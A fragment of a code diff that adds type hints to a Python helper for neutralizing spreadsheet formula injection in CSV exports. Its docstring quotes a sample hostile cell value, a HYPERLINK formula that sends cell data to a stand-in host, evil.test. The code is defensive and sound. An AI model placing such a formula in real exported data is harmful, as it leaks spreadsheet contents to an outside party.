@@ -166,7 +166,7 @@ def _ics_dt(dt: datetime) -> str:
     return dt.strftime("%Y%m%dT%H%M%SZ")
 
 
-def _csv_safe(value):
+def _csv_safe(value: Any) -> Any:
     """Neutralize spreadsheet formula injection in a cell value.
 
     A participant named ``=HYPERLINK("https://evil.test/?"&A1,"Results")``
